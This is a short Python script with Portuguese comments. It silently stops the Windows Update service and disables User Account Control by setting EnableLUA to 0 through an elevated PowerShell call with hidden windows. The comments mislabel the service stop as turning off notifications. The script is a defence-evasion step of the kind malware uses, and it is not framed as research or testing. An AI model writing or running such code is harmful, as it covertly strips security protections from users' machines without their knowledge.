import subprocess

# Comando para desativar notificações temporariamente
disable_notifications = 'powershell -Command "Stop-Service -Name wuauserv -Force"'

# Comando para desativar o UAC com privilégios administrativos e sem janelas visíveis
disable_uac = 'powershell -WindowStyle Hidden -Command "Start-Process PowerShell -ArgumentList \'Set-ItemProperty -Path \\"HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\" -Name EnableLUA -Value 0\' -Verb RunAs -WindowStyle Hidden"'

# Comando para reativar notificações após a execução
enable_notifications = 'powershell -Command "Start-Service -Name wuauserv"'

# Executa os comandos sem exibir janelas de terminal
subprocess.run(disable_notifications, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
subprocess.run(disable_uac, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
subprocess.run(enable_notifications, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)

#print("Configuração do UAC alterada. Reinicie o sistema para aplicar as mudanças.")
